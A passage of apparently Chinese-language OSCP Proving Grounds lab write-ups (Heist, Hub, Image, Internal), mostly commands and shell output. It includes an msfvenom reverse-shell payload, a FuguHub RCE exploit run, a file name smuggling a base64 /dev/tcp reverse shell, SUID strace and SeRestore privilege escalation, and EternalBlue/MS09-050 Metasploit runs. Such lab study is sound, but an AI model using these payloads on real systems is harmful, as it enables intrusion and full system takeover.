<li>可用于添加用户、修改权限等。</li>
</ol>
</li>
<li><p><strong>还原备份</strong>：</p>
<ol start="4">
<li>与备份工具（如 Windows Server Backup）配合，恢复系统文件或数据。</li>
</ol>
</li>
</ol>
</blockquote>
<p>简而言之： 拥有修改系统文件权限</p>
<p>利用SeRestoreAbuse.exe执行反弹shell， 成功得到管理员shell</p>
<blockquote>
<p><code>SeRestoreAbuse:``https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</code></p>
</blockquote>
<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o r.exe</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_apache<span class="variable">$</span>&gt; upload SeRestoreAbuse.exe</span><br><span class="line">                                      </span><br><span class="line">Info: Uploading /home/kali/Tools/pg/Heist/SeRestoreAbuse.exe to C:\Users\svc_apache<span class="variable">$</span>\SeRestoreAbuse.exe</span><br><span class="line">                                      </span><br><span class="line"><span class="keyword">Data</span>: <span class="number">22528</span> bytes of <span class="number">22528</span> bytes copied</span><br><span class="line">                                      </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_apache<span class="variable">$</span>&gt; upload r.exe</span><br><span class="line">                                      </span><br><span class="line">Info: Uploading /home/kali/Tools/pg/Heist/r.exe to C:\Users\svc_apache<span class="variable">$</span>\r.exe</span><br><span class="line">                                      </span><br><span class="line"><span class="keyword">Data</span>: <span class="number">9556</span> bytes of <span class="number">9556</span> bytes copied</span><br><span class="line">                                      </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_apache<span class="variable">$</span>&gt; .\SeRestoreAbuse.exe C:\Users\svc_apache<span class="variable">$</span>\r.exe</span><br><span class="line">RegCreateKeyExA result: <span class="number">0</span></span><br><span class="line">RegSetValueExA result: <span class="number">0</span></span><br><span class="line">SeRestoreAbuse.exe : <span class="built_in">start-service</span> : Service <span class="string">&#x27;Secondary Logon (seclogon)&#x27;</span> cannot be started due to the following error: Cannot <span class="built_in">start</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="operator">-</span>nvlp <span class="number">443</span></span><br><span class="line">listening <span class="keyword">on</span> [<span class="keyword">any</span>] <span class="number">443</span> ...</span><br><span class="line"><span class="keyword">connect</span> <span class="keyword">to</span> [<span class="number">192.168</span><span class="number">.45</span><span class="number">.165</span>] <span class="keyword">from</span> (<span class="literal">UNKNOWN</span>) [<span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span>] <span class="number">52353</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.2061</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. <span class="keyword">All</span> rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32<span class="operator">&gt;</span>whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\<span class="keyword">system</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
        <category>Active Directory</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Hub</title>
    <url>/post/20250216180517.html</url>
    <content><![CDATA[<h1 id="Difficult"><a href="#Difficult" class="headerlink" title="Difficult"></a>Difficult</h1><p>Easy</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><p>autorecon</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.4</span>p1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">80.</span></span><br><span class="line">    nginx/<span class="number">1.18</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">    http<span class="punctuation">:</span><span class="comment">//192.168.212.25/readme.txt</span></span><br><span class="line"></span><br><span class="line">    FuguHub BarracudaDrive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">8082.</span></span><br><span class="line">    barracudadrive.com</span><br><span class="line">    FuguHub <span class="number">8.4</span></span><br><span class="line"></span><br><span class="line">    WebDAV enable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">9999.</span></span><br><span class="line">    https </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="80-nginx"><a href="#80-nginx" class="headerlink" title="80 nginx"></a>80 nginx</h1><p>端口扫描有readme.txt, 服务端cms: FuguHub 8.0</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-60.png.png"></p>
<h1 id="8082-FuguHub"><a href="#8082-FuguHub" class="headerlink" title="8082 FuguHub"></a>8082 FuguHub</h1><p>可以直接进入，没有用户密码验证，在about页面看到fugu版本号 8.4</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-61.png.png"></p>
<h1 id="9999"><a href="#9999" class="headerlink" title="9999"></a>9999</h1><p>和8082一样，区别是9999是https</p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>searchsploit fuguhub, 8.1版本RCE</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-59.png.png"></p>
<p>google搜索 <code>fuguhub 8.4 exploit</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-62.png.png"></p>
<blockquote>
<p><a href="https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697">https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697</a></p>
</blockquote>
<p>克隆代码后，直接执行， 成功获取shell, 用户是root</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">https<span class="punctuation">:</span><span class="comment">//github.com/S─$ python exploit.py -r 192.168.212.25 -rp 8082 -l 192.168.45.234 -p 80</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Checking for admin user...</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> No admin user exists yet<span class="punctuation">,</span> creating account with admin<span class="punctuation">:</span>admin123</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User created!</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Logging in...</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Success! Injecting the reverse shell...</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Successfully injected the reverse shell into the About page.</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Triggering the reverse shell<span class="punctuation">,</span> check your listener...</span><br><span class="line">anjinDedic/FuguHub<span class="number">-8.4</span>-Authenticated-RCE-CVE<span class="number">-2024</span><span class="number">-27697</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">80</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.25</span><span class="punctuation">]</span> <span class="number">59038</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Image</title>
    <url>/post/20250216184512.html</url>
    <content><![CDATA[<h1 id="Difficult"><a href="#Difficult" class="headerlink" title="Difficult"></a>Difficult</h1><p>Meduim</p>
<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><h2 id="autorecon"><a href="#autorecon" class="headerlink" title="autorecon"></a>autorecon</h2><p><code>sudo autorecon 192.168.212.178</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.2</span>p1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">80.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.41</span></span><br><span class="line">    ImageMagick Identifier</span><br></pre></td></tr></table></figure>

<h1 id="80-ImageMagic"><a href="#80-ImageMagic" class="headerlink" title="80 ImageMagic"></a>80 ImageMagic</h1><p>随便上传一个文件， 成功后显示版本号 6.9.6-4</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-65.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>google搜索 <code>imagemagick 6.9.6 exploit</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-64.png.png"></p>
<p><a href="https://github.com/ImageMagick/ImageMagick/issues/6339">https://github.com/ImageMagick/ImageMagick/issues/6339</a></p>
<p>issue中提到 <code>CVE-2023-34152</code> 再次搜索找到github: <code>https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152</code>,克隆代码执行, 生成两个图片文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">└─$ ls</span><br><span class="line"> base.txt           &#x27;|en<span class="string">&quot;`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC84MCAwPiYxCg==&#x27;$&#x27;\n&#x27;&#x27; | base64 -d | bash`&quot;</span>.png&#x27;   README.md</span><br><span class="line"> CVE<span class="number">-2023</span><span class="number">-34152.</span>py   en.png  </span><br></pre></td></tr></table></figure>

<p>上传 <code>&#39;|en....png&#39;</code> ， 成功获得shell, cat &#x2F;etc&#x2F;passwd发现只有root一个账户</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">80</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.178</span><span class="punctuation">]</span> <span class="number">46508</span></span><br><span class="line">bash<span class="punctuation">:</span> cannot set terminal process group (<span class="number">1169</span>)<span class="punctuation">:</span> Inappropriate ioctl for device</span><br><span class="line">bash<span class="punctuation">:</span> no job control in this shell</span><br><span class="line">www-data@image<span class="punctuation">:</span>/var/www/html$ id</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span>root<span class="punctuation">:</span>/root<span class="punctuation">:</span>/bin/bash</span><br><span class="line">...</span><br><span class="line">fwupd-refresh<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">113</span><span class="punctuation">:</span><span class="number">117</span><span class="punctuation">:</span>fwupd-refresh user<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>下载linpeas并执行, 发现strace suid权限, gtfobins查找利用方式 <code>/usr/bin/strace -o /dev/null /bin/sh -p</code>提权成功</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-63.png.png"></p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/strace/">https://gtfobins.github.io/gtfobins/strace/</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">www-data@image<span class="punctuation">:</span>/var/www/html$ /usr/bin/strace -o /dev/<span class="literal"><span class="keyword">null</span></span> /bin/sh -p</span><br><span class="line">/usr/bin/strace -o /dev/<span class="literal"><span class="keyword">null</span></span> /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)<span class="punctuation">,</span><span class="number">33</span>(www-data)</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">ImageMagick<span class="number">-7.1</span><span class="number">.0</span><span class="number">-16</span></span><br><span class="line">email2.txt</span><br><span class="line">proof.txt</span><br><span class="line">snap</span><br><span class="line">cat proof.txt</span><br><span class="line"><span class="number">056</span>bd9764a79f6e07150768696acf296</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Internal</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-120.png.png"></p>
<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap -vv --reason -Pn -T4 -sV -p <span class="number">445</span> <span class="string">&quot;--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot;</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br></pre></td></tr></table></figure>

<p>msf查找17-010永恒之蓝</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search <span class="number">17</span><span class="number">-010</span></span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #   Name                                           Disclosure Date  Rank     Check  Description</span><br><span class="line">   -   ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   <span class="number">0</span>   exploit/windows/smb/ms17_010_eternalblue       <span class="number">2017</span><span class="number">-03</span><span class="number">-14</span>       average  Yes    MS17<span class="number">-010</span> EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   <span class="number">10</span>  exploit/windows/smb/ms17_010_psexec            <span class="number">2017</span><span class="number">-03</span><span class="number">-14</span>       normal   Yes    MS17<span class="number">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   MS17<span class="number">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   <span class="number">24</span>  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17<span class="number">-010</span> SMB RCE Detection   .</span><br><span class="line">   <span class="number">27</span>  exploit/windows/smb/smb_doublepulsar_rce       <span class="number">2017</span><span class="number">-04</span><span class="number">-14</span>       great    Yes    SMB DOUBLEPULSAR Remote Code Execution   </span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17-010_etenalblue 因为目标机器是32bit, 不成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Started reverse TCP handler on <span class="number">10.0</span><span class="number">.0</span><span class="number">.82</span><span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span>    - Host is likely VULNERABLE to MS17<span class="number">-010</span>! - Windows Server (R) <span class="number">2008</span> Standard <span class="number">6001</span> Service Pack <span class="number">1</span> x86 (<span class="number">32</span>-bit)</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span>    - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - The target is vulnerable.</span><br><span class="line"><span class="punctuation">[</span>-<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Exploit aborted due to failure<span class="punctuation">:</span> no-target<span class="punctuation">:</span> This module only supports x64 (<span class="number">64</span>-bit) targets</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Exploit completed<span class="punctuation">,</span> but no session was created.</span><br></pre></td></tr></table></figure>

<p>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec 利用不成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Started reverse TCP handler on <span class="number">10.0</span><span class="number">.0</span><span class="number">.82</span><span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Target OS<span class="punctuation">:</span> Windows Server (R) <span class="number">2008</span> Standard <span class="number">6001</span> Service Pack <span class="number">1</span></span><br><span class="line"><span class="punctuation">[</span>-<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Unable to find accessible named pipe!</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Exploit completed<span class="punctuation">,</span> but no session was created.</span><br></pre></td></tr></table></figure>

<p>最后找到利用exploit</p>
<blockquote>
<p><a href="https://github.com/d4t4s3c/Win7Blue">https://github.com/d4t4s3c/Win7Blue</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">]</span> <span class="number">49159</span></span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">6.0</span><span class="number">.6001</span><span class="punctuation">]</span></span><br><span class="line">Copyright (c) <span class="number">2006</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;ls</span><br><span class="line">ls</span><br><span class="line">&#x27;ls&#x27; is not recognized as an internal or external command<span class="punctuation">,</span></span><br><span class="line">operable program or batch file.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;dir /s/b *.txt</span><br><span class="line">dir /s/b *.txt</span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32\catroot2\dberr.txt</span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32\drivers\gmreadme.txt</span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32\en-US\license_addendum_1.txt</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;cd /users/</span><br><span class="line">cd /users/</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Users&gt;dir /s/b *.txt</span><br><span class="line">dir /s/b *.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\Administrator\AppData\Local\Microsoft\Internet Explorer\brndlog.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\Administrator\Desktop\network-secret.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\Administrator\Desktop\proof.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\Microsoft\Windows\WER\ReportQueue\Report08b7d99c\WERD5A6.tmp.version.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\Microsoft\Windows\WER\ReportQueue\Report08b7d99c\WERD5A7.tmp.appcompat.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\manifest.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\adobeflashcs3.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\adobephotoshopcs3.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\googledesktop.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\microsoftoffice.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\vistasidebar.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\visualstudio2005.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\vmwarefilters.txt</span><br><span class="line">C<span class="punctuation">:</span>\Users\All Users\VMware\VMware Tools\Unity Filters\win7gadgets.txt</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Users&gt;type C<span class="punctuation">:</span>\Users\Administrator\Desktop\proof.txt</span><br><span class="line">type C<span class="punctuation">:</span>\Users\Administrator\Desktop\proof.txt</span><br><span class="line"><span class="number">9e8</span>e470108c09747401e1a87089c2583</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Users&gt;   </span><br></pre></td></tr></table></figure>

<h1 id="MS09-050"><a href="#MS09-050" class="headerlink" title="MS09-050"></a>MS09-050</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap -script=smb-vuln\* -p445 <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span>SVN ( https<span class="punctuation">:</span><span class="comment">//nmap.org ) at 2025-02-06 11:29 CST</span></span><br><span class="line">Nmap scan report for <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line">Host is up (<span class="number">0.087</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">445</span>/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results<span class="punctuation">:</span></span><br><span class="line">| smb-vuln-cve2009<span class="number">-3103</span><span class="punctuation">:</span></span><br><span class="line">|   VULNERABLE<span class="punctuation">:</span></span><br><span class="line">|   SMBv2 exploit (CVE<span class="number">-2009</span><span class="number">-3103</span><span class="punctuation">,</span> Microsoft Security Advisory <span class="number">975497</span>)</span><br><span class="line">|     State<span class="punctuation">:</span> VULNERABLE</span><br><span class="line">|     IDs<span class="punctuation">:</span>  CVE<span class="punctuation">:</span>CVE<span class="number">-2009</span><span class="number">-3103</span></span><br><span class="line">|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold<span class="punctuation">,</span> SP1<span class="punctuation">,</span> and SP2<span class="punctuation">,</span></span><br><span class="line">|           Windows Server <span class="number">2008</span> Gold and SP2<span class="punctuation">,</span> and Windows <span class="number">7</span> RC allows remote attackers to execute arbitrary code or cause a</span><br><span class="line">|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</span><br><span class="line">|           PROTOCOL REQUEST packet<span class="punctuation">,</span> which triggers an attempted dereference of an out-of-bounds memory location<span class="punctuation">,</span></span><br><span class="line">|           aka <span class="string">&quot;SMBv2 Negotiation Vulnerability.&quot;</span></span><br><span class="line">|</span><br><span class="line">|     Disclosure date<span class="punctuation">:</span> <span class="number">2009</span><span class="number">-09</span><span class="number">-08</span></span><br><span class="line">|     References<span class="punctuation">:</span></span><br><span class="line">|       http<span class="punctuation">:</span><span class="comment">//www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line">|_      https<span class="punctuation">:</span><span class="comment">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line">|_smb-vuln-ms10<span class="number">-061</span><span class="punctuation">:</span> Could not negotiate a connection<span class="punctuation">:</span>SMB<span class="punctuation">:</span> Failed to receive bytes<span class="punctuation">:</span> EOF</span><br><span class="line">|_smb-vuln-ms10<span class="number">-054</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br></pre></td></tr></table></figure>

<p>msf利用</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Exploit completed<span class="punctuation">,</span> but no session was created.</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; search <span class="number">09</span><span class="number">-050</span></span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                       Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                                       ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     <span class="number">2009</span><span class="number">-09</span><span class="number">-07</span>       good    No     MS09<span class="number">-050</span> Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference</span><br><span class="line">   <span class="number">1</span>  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh  .                normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference</span><br><span class="line">   <span class="number">2</span>  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff     .                normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info <span class="number">2</span><span class="punctuation">,</span> use <span class="number">2</span> or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> No payload configured<span class="punctuation">,</span> defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index)<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s)<span class="punctuation">,</span> see https<span class="punctuation">:</span><span class="comment">//docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span></span><br><span class="line">   RPORT   <span class="number">445</span>              yes       The target port (TCP)</span><br><span class="line">   WAIT    <span class="number">180</span>              yes       The number of seconds to wait for the attack to complete.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp)<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span> seh<span class="punctuation">,</span> thread<span class="punctuation">,</span> process<span class="punctuation">,</span> none)</span><br><span class="line">   LHOST     <span class="number">10.0</span><span class="number">.0</span><span class="number">.82</span>        yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Windows Vista SP1/SP2 and Server <span class="number">2008</span> (x86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info<span class="punctuation">,</span> or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set lhost <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span></span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set rhosts <span class="number">192.168</span><span class="number">.197</span><span 